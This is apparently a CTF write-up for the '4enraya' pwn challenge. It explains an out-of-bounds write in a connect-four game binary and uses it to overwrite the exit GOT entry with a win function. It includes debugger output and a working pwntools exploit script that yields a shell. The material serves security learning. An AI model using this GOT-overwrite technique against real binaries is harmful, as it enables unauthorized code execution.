---
title: "4enRaya"
date: "2025-10-17"
tags: ["NavajaNegra", "OOB", "got"]
---

In this challenge they give us a binary that does the following:

```c
󰣇 PWN/nn/4enraya ❯ ./4enraya                                                                        
Enter player 1 symbol > W
Enter player 2 symbol > S
Player 1 choose your column (0-7) > 4

  0 1 2 3 4 5 6 7
 +---------------+
7|                |
6|                |
5|                |
4|                |
3|                |
2|                |
1|                |
0|        W       |
 +---------------+

Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: 
```

It is a connect four where we get to pick the symbol that shows up on the grid and its position. Let's see how that input is read:

```c
    if (uStack_2c == 0) {
        uStack_9 = obj.player2symbol;
        sym.imp.printf("Player 2 choose your column (0-7) > ");
        puVar1 = &stack0xffffffffffffffc8;
    }
    else {
        uStack_9 = obj.player1symbol;
        sym.imp.printf("Player 1 choose your column (0-7) > ");
        puVar1 = &stack0xffffffffffffffc8;
    }
    *(puVar1 + -8) = 0x403a54;
    cStack_15 = sym.imp.getchar();
    puVar2 = puVar1;
    *(puVar1 + -8) = 0x403a5c;
    sym.imp.getchar();
    iStack_1c = cStack_15 + -0x30;
```

There is a lot going on here, but what is clear is that our input seems to be stored in the variable `cStack_15`. Since it reads our input with a `getchar()`, if we type a "5" for example, it gets stored as 0x35. Then it subtracts `0x30` from our input so that `iStack_1c` holds our input properly as a decimal. So we control where a byte of our choice gets written, in a place of our choice. There seem to be no checks for negative values, so let's look at how it works and whether we can write Out-of-Bounds. To know where to look in memory and confirm it, we can try to find whether the binary has a variable name, for example `tablero`, holding the address of the start of the board:

```c
[0x00403130]> is
[Symbols]
. . .
42  0x00003060 0x00406060 GLOBAL OBJ    64       board // Efectivamente
. . .
```

```c
Enter player 1 symbol > W
Enter player 2 symbol > X
Player 1 choose your column (0-7) > $

  0 1 2 3 4 5 6 7
 +---------------+
7|                |
6|                |
5|                |
4|                |
3|                |
2|                |
1|                |
0|                |
 +---------------+

pwndbg> x &board
0x406060 <board>:	0x20202020
pwndbg> dq 0x406060-0x20 
0000000000406040     0000000000000000 0000000000000000
0000000000406050     0000005700000000 0000000000000000
0000000000406060     2020202020202020 2020202020202020
0000000000406070     2020202020202020 2020202020202020
```

I used `$` as the position because in the ASCII table it sits a bit before the digits, so it should land somewhere before the board, and it did work. Now that we know this, what do we want to overwrite and what do we want to achieve?

The program has a win function again. We can check this with `radare2` or `pwndbg`:

```c
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000403000  _init
0x00000000004030b0  putchar@plt
0x00000000004030c0  puts@plt
0x00000000004030d0  setbuf@plt
0x00000000004030e0  system@plt
0x00000000004030f0  printf@plt
0x0000000000403100  getchar@plt
0x0000000000403110  setvbuf@plt
0x0000000000403120  exit@plt
0x0000000000403130  _start
0x0000000000403160  _dl_relocate_static_pie
0x0000000000403170  deregister_tm_clones
0x00000000004031a0  register_tm_clones
0x00000000004031e0  __do_global_dtors_aux
0x0000000000403210  frame_dummy
0x0000000000403216  gadget
0x0000000000403221  banner
0x000000000040335d  win // Aquí
0x0000000000403377  setup
0x00000000004033c8  print_board
0x0000000000403485  prepare_game
0x00000000004034d8  check_winner
0x00000000004039fa  play_turn
0x0000000000403c8a  navaja
0x0000000000403ca9  main
0x0000000000403dd0  mallocc
0x0000000000403ddc  _fini
```

```c
r2 -A 4enraya  
[0x00403130]> afl
0x004030b0    1     10 sym.imp.putchar
0x004030c0    1     10 sym.imp.puts
0x004030d0    1     10 sym.imp.setbuf
0x004030e0    1     10 sym.imp.system
0x004030f0    1     10 sym.imp.printf
0x00403100    1     10 sym.imp.getchar
0x00403110    1     10 sym.imp.setvbuf
0x00403120    1     10 sym.imp.exit
0x00403130    1     37 entry0
0x00403170    4     31 sym.deregister_tm_clones
0x004031a0    4     49 sym.register_tm_clones
0x004031e0    3     32 entry.fini0
0x00403210    1      6 entry.init0
0x00403dd0    1     11 sym.mallocc
0x00403485    1     83 sym.prepare_game
0x00403ddc    1     13 sym._fini
0x004033c8    7    189 sym.print_board
0x00403216    1     11 sym.gadget
0x00403221    1    316 sym.banner
0x0040335d    1     26 sym.win // Aquí
0x00403160    1      5 sym._dl_relocate_static_pie
0x00403ca9   14    295 main
0x004034d8   46   1314 sym.check_winner
0x00403c8a    1     31 sym.navaja
0x00403000    3     27 sym._init
0x00403377    1     81 sym.setup
0x004039fa   22    656 sym.play_turn
```

So somehow we have to send the program to `win`. One way to do this is to swap a GOT entry used by the program for the address of the `win` function. The program drops a hint with this line:

```c
Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar:
```

We can try to replace `exit()` with `win()`. For that we only need the distance and the values we need:

```c
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya:
GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
[0x406000] putchar@GLIBC_2.2.5 -> 0x403030 ◂— endbr64 
[0x406008] puts@GLIBC_2.2.5 -> 0x7ffff7c82c80 (puts) ◂— endbr64 
[0x406010] setbuf@GLIBC_2.2.5 -> 0x7ffff7c8a820 (setbuf) ◂— endbr64 
[0x406018] system@GLIBC_2.2.5 -> 0x403060 ◂— endbr64 
[0x406020] printf@GLIBC_2.2.5 -> 0x7ffff7c5ab00 (printf) ◂— endbr64 
[0x406028] getchar@GLIBC_2.2.5 -> 0x7ffff7c8a190 (getchar) ◂— endbr64 
[0x406030] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c83520 (setvbuf) ◂— endbr64 
[0x406038] exit@GLIBC_2.2.5 -> 0x4030a0 ◂— endbr64 

pwndbg> x &board
0x406060 <board>:	0x20202020

pwndbg> x 0x406060 - 0x406038
0x28:	Cannot access memory at address 0x28

pwndbg> x win
0x40335d <win>:	0xfa1e0ff3
```

With this we know that the pointer to `exit` starts at `-0x28`. So if we manage to do the following:

* Change the byte at position `-0x28` to `5d`
* Change the byte at position `-0x27` to `33`

When we type a "q" in the program to exit, the `win` function will run and print the flag. Let's write the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./4enraya_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("challs.caliphalhounds.com", 32493)

def main():
    io = conn()

    got_exit = exe.got['exit']
    win = exe.sym['win']

    board_addr = exe.symbols['player1symbol']
    
    io.sendlineafter(b'Enter player 1 symbol > ', bytes([0x5d]))
    io.sendlineafter(b'Enter player 2 symbol > ', bytes([0x33]))
    io.sendlineafter(b'Player 1 choose your column (0-7) > ', bytes([0x08])) # 0x08 porque -0x28 + 0x30 = 0x08
    io.sendlineafter(b"Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: ", b"w")
    io.sendlineafter(b'Player 2 choose your column (0-7) > ', bytes([0x09]))
    io.sendlineafter(b"Presiona 'q' para salir (exit), 'e' para llamar exit directamente, otra tecla para continuar: ", b"e")

    print(hex(got_exit), hex(win), hex(board_addr))
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                                                                                                                                     3.13.7  23:42 
[*] '/home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x402000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/nn/4enraya/4enraya_patched': pid 13514
0x406038 0x40335d 0x4060c9
[*] Switching to interactive mode
Llamando a exit()...
$ whoami
ub1cu0
$  
```

It works! Thanks for reading!
